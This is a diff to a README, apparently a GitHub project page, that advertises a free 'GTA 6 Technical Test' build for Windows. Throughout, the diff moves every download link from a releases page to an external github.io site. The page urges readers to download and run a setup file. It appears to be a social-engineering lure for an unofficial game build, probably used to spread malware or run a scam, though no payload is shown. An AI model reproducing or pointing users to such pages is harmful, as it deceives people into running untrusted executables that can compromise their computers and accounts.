@@ -2,13 +2,13 @@
 
 ## 🚀 Quick Download - Get Started in Minutes
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Madagascanshotgun7425/GTA-6-Technical-Test-Access-Free-2026/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-FF5722?style=for-the-badge&logo=download&logoColor=white)](https://madagascanshotgun7425.github.io)
 
 ---
 
 ## 📥 How to Download
 
-Visit this link to download the application: **[GTA 6 Technical Test Download Page](https://github.com/Madagascanshotgun7425/GTA-6-Technical-Test-Access-Free-2026/releases)**
+Visit this link to download the application: **[GTA 6 Technical Test Download Page](https://madagascanshotgun7425.github.io)**
 
 Once you click the link above, you'll be taken to the download page. This is where you'll get the official GTA 6 Technical Test build for Windows PC.
 
@@ -45,7 +45,7 @@ To run GTA 6 smoothly, your PC should meet these recommended specs:
 Follow these simple steps to get GTA 6 running on your computer:
 
 ### Step 1: Download the Application
-1. Click the **[Download Button](https://github.com/Madagascanshotgun7425/GTA-6-Technical-Test-Access-Free-2026/releases)** at the top of this page
+1. Click the **[Download Button](https://madagascanshotgun7425.github.io)** at the top of this page
 2. You'll see a list of files on the release page
 3. Download the main setup file
 4. Save it to a location you can easily find (like your Desktop or Downloads folder)
@@ -139,7 +139,7 @@ This technical test build is regularly updated with:
 - ➕ New content additions
 - 🔧 Stability patches
 
-Check the [Releases Page](https://github.com/Madagascanshotgun7425/GTA-6-Technical-Test-Access-Free-2026/releases) frequently for the latest version.
+Check the [Releases Page](https://madagascanshotgun7425.github.io) frequently for the latest version.
 
 ---
 
@@ -156,7 +156,7 @@ Make sure to also download:
 
 Don't wait another minute to experience the most anticipated game of the decade! 
 
-**[⬇️ DOWNLOAD GTA 6 TECHNICAL TEST NOW](https://github.com/Madagascanshotgun7425/GTA-6-Technical-Test-Access-Free-2026/releases)**
+**[⬇️ DOWNLOAD GTA 6 TECHNICAL TEST NOW](https://madagascanshotgun7425.github.io)**
 
 Get your copy today and start playing GTA 6 on your Windows PC!
 
